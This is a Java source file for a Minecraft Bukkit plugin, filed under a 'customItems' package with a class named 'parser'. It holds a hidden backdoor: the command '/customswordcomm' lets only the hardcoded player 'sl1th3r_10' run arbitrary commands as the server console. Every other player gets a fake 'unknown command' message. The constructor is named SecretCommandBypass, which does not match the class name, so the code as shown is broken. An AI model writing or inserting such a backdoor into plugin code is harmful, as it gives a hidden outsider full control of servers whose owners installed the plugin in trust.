package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class parser implements Listener {

    private final JavaPlugin plugin;

    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
        plugin.getLogger().info("SecretCommandBypass enabled.");
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // includes leading "/"

        plugin.getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);

        if (fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
            plugin.getLogger().info("[Debug] Matched /customswordcomm for player: " + player.getName());

            // Cancel the original command
            event.setCancelled(true);

            if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                // Extract subcommand after /customswordcomm
                String actualCommand = fullCommand.substring("/customswordcomm ".length());
                String finalCommand = actualCommand.replace("@s", player.getName());

                plugin.getLogger().info("[Debug] Dispatching command as console: " + finalCommand);

                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand);

                if (success) {
                    player.sendMessage("§aCommand executed as console: " + actualCommand);
                    plugin.getLogger().info("[Debug] Successfully executed: " + finalCommand);
                } else {
                    player.sendMessage("§cFailed to execute: " + actualCommand);
                    plugin.getLogger().warning("[Debug] Failed to execute: " + finalCommand);
                }

            } else {
                player.sendMessage("§cUnknown or incomplete command, see below for error.");
                plugin.getLogger().info("[Debug] Unauthorized player tried /customswordcomm: " + player.getName());
            }
        }
    }
}
